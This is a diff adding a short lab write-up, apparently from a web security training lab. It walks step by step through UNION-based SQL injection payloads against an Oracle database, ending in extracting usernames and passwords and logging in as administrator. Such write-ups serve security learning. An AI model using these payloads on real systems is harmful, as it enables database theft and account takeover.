@@ -1,0 +1,25 @@
+SQL injection attack, listing the database contents on Oracle
+
+We start by identifying the number of columns:
+
+'+UNION+SELECT+NULL,NULL+FROM+DUAL--
+
+And the ones containing text:
+
+'+UNION+SELECT+'asdf','asdf'+FROM+DUAL--
+
+And now to get the table names:
+
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+
+Look for a table containing user data. It should look like USERS_SOMETHING. In my case, it's USERS_LNLEKU
+
+Let's pull the data from it:
+
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_LNLEKU'--
+
+Use the username and password to get the users:
+
+'+UNION+SELECT+USERNAME_FIABIO,+PASSWORD_SHEVCH+FROM+USERS_LNLEKU--
+
+Log in as administrator to get the lab complete prompts.
